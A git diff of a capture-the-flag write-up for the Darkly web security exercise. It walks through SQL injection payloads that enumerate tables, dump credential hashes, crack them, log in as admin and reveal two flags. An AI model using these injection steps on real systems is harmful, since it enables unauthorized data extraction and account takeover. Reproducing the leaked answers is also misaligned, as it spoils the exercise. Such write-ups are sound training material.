@@ -1,11 +1,8 @@
 # SQL Injection
 <br>
 
-## Target Information
+**Endpoint:** `http://darkly.fr/index.php?page=member`
 
-* **Application:** Darkly (42 Cybersecurity Project)
-* **Endpoint:** `http://darkly.fr/?page=member`
-* **Host Resolution:** `darkly.fr` mapped to VM IP via `/etc/hosts`
 
 ---
 
@@ -322,3 +319,152 @@ echo -n "fortytwo" | sha256sum
 ```
 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 ```
+<br>
+<br>
+
+# 1. Expanding the Exploration
+After finding the flag in the users table, I decided to continue exploring the other tables.
+
+* **database**: Member_Brute_Force
+* **table**: db_default
+
+<br>
+
+# 2. Column Enumeration
+
+To identify the table structure, the following payload was used:
+```
+1 UNION SELECT column_name, 2 
+FROM information_schema.columns 
+WHERE table_schema = 0x4d656d6265725f42727574655f466f726365 
+AND table_name = 0x64625f64656661756c74
+```
+
+<br>
+
+The following columns were identified:
+* id
+* username
+* password
+
+<br>
+
+# 3. Credential Extraction
+
+After identifying the column names, the following payload was executed:
+```
+1 UNION SELECT username, password
+FROM Member_Brute_Force.db_default
+```
+
+**Result:**
+```
+username: root
+password: 3bf1114a986ba87ed28fc1b5884fc2f8
+ 
+username: admin
+password: 3bf1114a986ba87ed28fc1b5884fc2f8
+```
+<br>
+
+# 4. Hash Cracking
+Using crackstation.net we recovered the original value:
+```
+3bf1114a986ba87ed28fc1b5884fc2f8 -> shadow
+```
+<br>
+
+# 5. Authentication Bypass
+
+Using either credential pair:
+
+* root : shadow
+* admin : shadow
+
+Authentication was successful, leading to flag retrieval.
+
+![alt text](1.4-SQLi.png)
+
+# 🎉 Flag (2/14)
+```
+b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
+```
+
+<br>
+<br>
+
+# 1. Continuing  the Exploration
+* **database**: Member_images
+* **table**: list_images
+
+<br>
+
+# 2. Column Enumeration
+
+To identify the table structure, the following payload was used:
+```
+1 UNION SELECT column_name, 2 
+FROM information_schema.columns 
+WHERE table_schema = 0x4d656d6265725f696d61676573 
+AND table_name = 0x6c6973745f696d61676573
+```
+
+<br>
+
+The following columns were identified:
+* id
+* url
+* title
+* comment
+
+<br>
+
+# 3. Extraction
+
+After identifying the column names, the following payload was executed:
+```
+1 UNION SELECT id, url
+FROM Member_images.list_images
+
+and
+
+1 UNION SELECT title, comment
+FROM Member_images.list_images
+```
+
+**Relevant Result:**
+```
+id:			5
+url:		borntosec.ddns.net/images.png
+title:		Hack me ?
+comment:	If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+```
+<br>
+
+# 4. Hash Cracking
+Using crackstation.net we recovered the original value:
+```
+1928e8083cf461a51303633093573c46 -> albatroz
+```
+<br>
+
+# 5. Generate SHA-256
+```
+echo -n "albatroz" | sha256sum
+```
+
+**Result:**
+
+```
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+```
+
+---
+
+# 🎉 Flag (3/14)
+
+```
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+```
+<br>
+<br>
